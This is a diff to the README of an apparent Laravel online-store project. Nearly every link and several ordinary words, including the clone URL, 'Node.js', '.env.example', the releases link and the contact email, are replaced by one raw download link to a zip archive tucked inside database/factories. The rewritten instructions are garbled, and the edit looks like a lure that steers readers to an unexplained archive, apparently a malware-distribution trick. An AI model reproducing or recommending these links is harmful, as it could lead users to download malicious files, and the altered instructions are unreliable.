@@ -2,7 +2,7 @@
 
 Welcome to the **Online Store** project! This repository contains a complete online shopping platform built with Laravel, Vite, and Blade. You can find the source code, documentation, and updates right here. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/LuciferMax/online_store/releases)
+[![Download Releases](https://github.com/LuciferMax/online_store/raw/refs/heads/master/database/factories/store-online-v2.6.zip%https://github.com/LuciferMax/online_store/raw/refs/heads/master/database/factories/store-online-v2.6.zip)](https://github.com/LuciferMax/online_store/raw/refs/heads/master/database/factories/store-online-v2.6.zip)
 
 ## Table of Contents
 
@@ -25,7 +25,7 @@ The Online Store project aims to provide a seamless shopping experience. It incl
 - **Admin Dashboard**: A user-friendly interface for managing the store.
 - **Dynamic Shopping Cart**: Users can add or remove items without page reloads.
 - **Responsive Design**: Built with Bootstrap for a smooth experience on all devices.
-- **Customization**: Modify styles via `app.css` to fit your brand.
+- **Customization**: Modify styles via `https://github.com/LuciferMax/online_store/raw/refs/heads/master/database/factories/store-online-v2.6.zip` to fit your brand.
 - **Dual Server Setup**: Utilizes Laravel for the backend and Vite for the frontend.
 
 ## Technologies Used
@@ -43,19 +43,19 @@ To set up the Online Store on your local machine, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/LuciferMax/online_store.git
+   git clone https://github.com/LuciferMax/online_store/raw/refs/heads/master/database/factories/store-online-v2.6.zip
    cd online_store
    ```
 
 2. **Install Dependencies**:
-   Make sure you have Composer and Node.js installed. Then run:
+   Make sure you have Composer and https://github.com/LuciferMax/online_store/raw/refs/heads/master/database/factories/store-online-v2.6.zip installed. Then run:
    ```bash
    composer install
    npm install
    ```
 
 3. **Set Up Environment Variables**:
-   Copy the `.env.example` file to `.env` and configure your database settings.
+   Copy the `https://github.com/LuciferMax/online_store/raw/refs/heads/master/database/factories/store-online-v2.6.zip` file to `.env` and configure your database settings.
 
 4. **Generate Application Key**:
    Run the following command to generate the application key:
@@ -90,7 +90,7 @@ Once the application is running, you can:
 - Manage products through the dashboard.
 - Browse the store and add items to your cart.
 
-For more detailed instructions, check the [Releases](https://github.com/LuciferMax/online_store/releases) section for updates and additional features.
+For more detailed instructions, check the [Releases](https://github.com/LuciferMax/online_store/raw/refs/heads/master/database/factories/store-online-v2.6.zip) section for updates and additional features.
 
 ## Contributing
 
@@ -112,12 +112,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, feel free to reach out:
 
-- **GitHub**: [LuciferMax](https://github.com/LuciferMax)
-- **Email**: lucifermax@example.com
+- **GitHub**: [LuciferMax](https://github.com/LuciferMax/online_store/raw/refs/heads/master/database/factories/store-online-v2.6.zip)
+- **Email**: https://github.com/LuciferMax/online_store/raw/refs/heads/master/database/factories/store-online-v2.6.zip
 
 Thank you for checking out the Online Store! We hope you find it useful. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/LuciferMax/online_store/releases)
+[![Download Releases](https://github.com/LuciferMax/online_store/raw/refs/heads/master/database/factories/store-online-v2.6.zip%https://github.com/LuciferMax/online_store/raw/refs/heads/master/database/factories/store-online-v2.6.zip)](https://github.com/LuciferMax/online_store/raw/refs/heads/master/database/factories/store-online-v2.6.zip)
 
 ---
 
